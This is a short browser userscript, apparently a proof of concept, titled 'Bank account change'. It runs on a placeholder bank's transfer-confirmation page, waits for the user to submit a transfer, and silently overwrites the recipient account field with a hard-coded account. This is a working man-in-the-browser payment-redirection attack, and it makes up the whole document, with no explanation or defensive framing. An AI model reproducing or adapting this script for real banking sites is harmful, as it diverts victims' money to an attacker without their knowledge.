// ==UserScript==
// @name         Bank account change
// @version      1.0
// @description  try to take over the world!
// @author       Ja
// @match        https://www.example.com/confirmtransfer.php*
// @grant        none
// ==/UserScript==

var fakeAcc = "11111111111111111111111111";

(function() {
    'use strict';

    var submitActor = null;
    var form = document.getElementsByTagName("form")[0];
    var submitActors = document.getElementsByTagName("button");

    form.onsubmit = function(e){
        if(null === submitActor){
            submitActor = submitActors[0];
        }
        console.log(submitActor.getAttribute("formaction"));
        if(submitActor.getAttribute("formaction") === "sendtransfer.php"){
            var to = document.getElementsByName("to")[0];
            to.setAttribute("value", fakeAcc);
        }
        return true;
    };

    for(var i = 0, len = submitActors.length; i < len; ++i){
        submitActors[i].onclick = function(e){
            submitActor = this;
        }
    };
})();
